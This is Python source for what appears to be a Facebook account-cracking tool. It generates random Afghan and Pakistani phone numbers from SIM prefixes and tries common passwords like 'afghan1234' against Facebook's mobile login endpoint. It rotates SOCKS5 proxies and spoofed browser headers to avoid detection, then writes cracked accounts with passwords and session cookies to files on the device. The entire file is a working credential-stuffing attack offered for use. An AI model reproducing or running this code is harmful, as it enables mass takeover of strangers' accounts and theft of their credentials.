
def awm1():
    os.system("clear")
    print(logo)
    clear()        
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan12345', 'afghan1234']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()


def awm2():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan1234']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm3():
    os.system("clear")
    print(logo)
    clear()
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;92mPAKISTAN SIM CODES  \033[1;91m       : \033[1;96m92304, 92308 , 92333')
    print(f'\033[1;97m[!] \033[1;92mPAKISTAN SIM CODES \033[1;91m: \033[1;96m0301, 0304')
    print(f'\033[1;97m[!] \033[1;92mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'khankhan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def freeq(uid,pwx,tl):
    global loop
    global ok
    global cp
    global ugen
    try:
        for ps in pwx:
        	
            bi = random.choice([A])
            session = requests.Session()
            awml1 = ['fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.8']
            awmt2 = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
            awmc3 = ['"Android"', '"Windows"', '"Linux"']
            awmm4 = ['POST', 'GET', 'path']
            awmfetch2 = ['cros', 'navigate']
            awmdest2 = ['empty', 'document']
            awmr5 = ['https://t.facebook.com/', 'https://m.facebook.com/', 'https://p.facebook.com/', 'https://x.facebook.com/', 'https://d.facebook.com/']
            awms6 = ['"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"', '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"', '"Google Chrome";v="108", "Not)A;Brand";v="8", "Chromium";v="108"']
            awmco7 = ['"dark"', '"light"']           
            awmram9 = ['2', '3', '4', '6', '8', '10', '12']
            awmau2 = ['m.facebook.com', 'mbasic.facebook.com', 'p.facebook.com', 'free.facebook.com']
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            pro = random.choice(ugen)   
            awml = random.choice(awml1)
            awmt = random.choice(awmt2)
            awmc = random.choice(awmc3)
            awmm = random.choice(awmm4)
            awmr = random.choice(awmr5)
            awms = random.choice(awms6)
            awmco = random.choice(awmco7)
            awmfetch = random.choice(awmfetch2)            
            awmau = random.choice(awmau2)
            awmram = random.choice(awmram9)
            free_fb = session.get('https://m.beta.facebook.com').text
            log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
            header_freefb = {
    'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX1911"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mJANAN-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n ')
                cek_apk(session,coki)
                open('/sdcard/JANAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mJANAN-Cp\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                    open('/sdcard/Aking-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[JANAN] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    main()
